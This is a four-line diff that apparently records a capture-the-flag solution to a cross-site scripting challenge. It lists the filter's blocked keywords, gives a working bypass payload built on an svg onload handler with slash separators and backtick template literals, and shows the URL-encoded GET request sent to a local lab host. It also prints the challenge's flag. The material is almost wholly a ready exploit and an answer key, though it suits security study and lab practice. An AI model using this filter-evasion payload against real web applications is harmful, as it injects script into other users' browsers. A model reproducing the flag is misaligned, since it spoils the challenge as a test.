@@ -1,0 +1,4 @@
+# XSS filter bypass. Blocked: script, onerror, single quotes, spaces. Bypass: <svg/onload=alert`XSS`> (slash as separator, backtick template literals). Returns flag{0f8d7152-07c4-4be5-a744-e356fafc5a8e}
+
+GET /page?name=%3Csvg%2Fonload%3Dalert%60XSS%60%3E HTTP/1.1
+Host: 172.17.0.1:48713
